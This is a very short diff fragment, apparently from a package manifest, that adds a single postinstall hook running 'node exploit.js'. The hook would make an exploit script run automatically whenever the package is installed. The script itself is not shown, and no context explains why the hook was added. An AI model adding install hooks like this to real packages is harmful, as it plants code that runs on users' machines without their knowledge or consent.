@@ -1,0 +1,2 @@
+
+"postinstall": "node exploit.js"
